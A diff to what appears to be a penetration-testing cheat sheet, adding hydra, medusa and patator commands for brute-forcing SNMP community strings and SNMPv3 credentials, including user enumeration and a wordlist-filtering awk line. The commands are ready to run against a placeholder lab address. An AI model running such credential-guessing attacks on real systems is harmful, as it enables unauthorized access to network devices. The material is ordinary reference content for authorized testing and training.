@@ -190,7 +190,12 @@ hydra -l '<email>' -P '<passwords.txt>' 10.10.10.10 smtp
 hydra  -P '<snmp-community-strings.txt>' 10.10.10.10 snmp
 ```
 >  The command above will not work for SNMPv3 because SNMPv3 uses username and password for authentication, unlike SNMPv1 and SNMPv2 which rely on community strings.
-> You can also use onesixtyone as follow: onesixtyone -c </usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt> 10.10.10.10
+Refer to this command for `SNMPv3` :
+```
+hydra -l '<user>' -P '<passwords.txt>' -m:3:MD5 10.10.10.10 snmp
+```
+> 1. This will perform a dicitonary attack using the `AuthNoPriv` security level. Furthermore, The SNMPv3 module so far only support authentication (md5/sha), not yet encryption. For more information, run `hydra snmp -U`
+> 2. Note that the SNMPv3 module is still in beta state in hydra. Hence, it may not work properly. A better alternative will be `[snmpwn](https://github.com/hatlord/snmpwn)`
 
 ### SSH
 ```
@@ -294,6 +299,7 @@ medusa -h 10.10.10.10 -u '<email>' -P '<passwords.txt>' -M smtp
 ```
 medusa -h 10.10.10.10 -u '' -P '<passwords.txt>' -M snmp
 ```
+> Medusa only supports SNMPv1 and v2c
 
 ### SSH
 ```
@@ -414,9 +420,29 @@ patator smtp_login host=10.10.10.10 user='<email>' password=FILE0 0='<passwords.
 ```
 
 ### SNMP
+Here is the syntax for `SNMPv1/v2c`
 ```
 patator snmp_login host=10.10.10.10 community=FILE0 0='<passwords.txt>' -x ignore:mesg='No SNMP response received before timeout'
 ```
+> Patator can also be used to perform a SNMPv3 username enumeration and dictionary attack.
+#### SNMPv3 username enumeration
+```
+patator snmp_login host=10.10.10.10 version=3 user=FILE0 0=users.txt -x ignore:mesg='Unknown USM user'
+```
+#### SNMPv3 dictionary attack
+```
+patator snmp_login host=10.10.10.10 version=3 user=<user> auth_proto=md5 auth_key=FILE0 0=passwords.txt -x ignore:mesg='Wrong SNMP PDU digest' -x ignore:mesg='SNMPv3 requires passwords to be at least 8 characters long'
+```
+> Patator doesn't take into consideration that `SNMPv3` requires passwords to be at least 8 characters. It tries every password no matter the length.
+To fix that, we must select words that have at least 8 characters :
+```
+awk '{ for (i=1; i<=NF; i++) if (length($i) >= 8) print $i }' <passwords.txt> > long_words.txt
+```
+After that we can execute `patator` with the following command :
+```
+patator snmp_login host=10.10.10.10 version=3 user=<user> auth_proto=md5 auth_key=FILE0 0=long_words.txt -x ignore:mesg='Wrong SNMP PDU digest'
+```
+> Refer to the help menu `patator snmp_login -h` to learn more about this attack
 
 ### SSH
 ```
